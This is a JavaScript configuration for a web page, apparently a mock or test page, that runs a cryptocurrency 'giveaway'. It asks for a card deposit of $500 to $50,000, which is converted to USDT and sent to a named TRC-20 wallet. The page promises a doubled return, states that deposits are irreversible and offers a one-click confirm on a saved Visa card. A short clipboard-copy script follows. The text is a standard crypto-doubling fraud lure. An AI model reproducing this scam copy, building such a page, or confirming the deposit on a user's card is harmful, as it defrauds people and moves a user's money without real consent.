window.PAGE_CONFIG = {
 "initial": null,
 "views": {
  "card": {
   "title": "Deposit using card",
   "blocks": [
    {
     "id": "dx-card-intro",
     "text": "Deposit with your debit or credit card of any U.S. bank. Your card deposit is converted to USDT and entered in the giveaway. Deposit from $500 to $50 000."
    },
    {
     "id": "dx-card-method",
     "rows": [
      [
       "Payment method",
       "Saved card: Visa •••• 4417"
      ],
      [
       "Deposit amount",
       "$1 000.00"
      ],
      [
       "Giveaway return",
       "$2 000.00 (doubled)"
      ]
     ]
    }
   ],
   "buttons": [
    {
     "label": "Continue",
     "do": "open:confirm",
     "primary": true
    },
    {
     "label": "Giveaway rules",
     "do": "go:rules",
     "link": true
    },
    {
     "label": "Back to main page",
     "do": "go:home",
     "link": true
    }
   ]
  },
  "rules": {
   "title": "Giveaway rules",
   "blocks": [
    {
     "id": "dx-rules-1",
     "text": "Card deposits are converted to USDT and sent to the giveaway pool wallet. Once a deposit is submitted it cannot be reversed or refunded."
    },
    {
     "id": "dx-rules-2",
     "text": "Doubled funds are sent after all network confirmations, to the card or wallet that made the deposit. One participation per person."
    },
    {
     "id": "dx-rules-3",
     "text": "Participation is first come, first served: a deposit sent after the pool is exhausted is not matched."
    }
   ],
   "buttons": [
    {
     "label": "Deposit using card",
     "do": "go:card",
     "primary": true
    },
    {
     "label": "Back to main page",
     "do": "go:home",
     "link": true
    }
   ]
  },
  "confirm": {
   "title": "Confirm card deposit",
   "blocks": [
    {
     "id": "dx-confirm-summary",
     "rows": [
      [
       "Deposit",
       "$1 000.00 by card"
      ],
      [
       "Sent to",
       "Giveaway pool wallet TKH7nKdXy7wMCdgqi9yxbnEF3yyg5GHzXR (USDT TRC-20)"
      ],
      [
       "Return",
       "$2 000.00 after all network confirmations"
      ]
     ]
    },
    {
     "id": "dx-confirm-note",
     "class": "dx-small",
     "text": "Card deposits are converted to USDT and cannot be reversed or refunded once submitted."
    }
   ],
   "buttons": [
    {
     "label": "Confirm deposit $1 000",
     "do": "act:deposit",
     "primary": true
    },
    {
     "label": "Giveaway rules",
     "do": "go:rules",
     "link": true
    },
    {
     "label": "Back",
     "do": "cancel"
    }
   ]
  },
  "receipt": {
   "title": "Deposit received",
   "blocks": [
    {
     "id": "dx-receipt",
     "text": "Deposit #GW-20417 received: $1 000.00 converted to USDT and entered in the giveaway. Your return of $2 000.00 will be sent after all confirmations."
    }
   ],
   "buttons": [
    {
     "label": "Done",
     "do": "close"
    }
   ]
  }
 },
 "actions": {
  "deposit": {
   "requires_view": "confirm",
   "receipt_view": "receipt",
   "ref": "GW-20417"
  }
 },
 "prefix": "ev51156",
 "mounts": [
  {
   "id": "dx-page-card",
   "default_view": "card"
  },
  {
   "id": "dx-page-rules",
   "default_view": "rules"
  }
 ],
 "pages": {
  "card": {
   "file": "card.html"
  },
  "rules": {
   "file": "rules.html"
  }
 },
 "leave_links": true,
 "dismiss": [],
 "text": {}
};

;(function () {
  var timers = new WeakMap();
  document.addEventListener('click', function (e) {
    var t = e.target.closest ? e.target.closest('.btn-blueDark-two') : null;
    if (!t) return;
    var box = t.parentNode, inp = box && box.querySelector('input');
    if (!inp) return;
    inp.focus(); inp.select();
    try { if (navigator.clipboard) navigator.clipboard.writeText(inp.value).catch(function () {}); } catch (x) {}
    if (!timers.has(t)) t.setAttribute('data-label', t.textContent);
    t.textContent = 'Copied';
    clearTimeout(timers.get(t));
    timers.set(t, setTimeout(function () { t.textContent = t.getAttribute('data-label'); timers.delete(t); }, 1500));
  });
})();
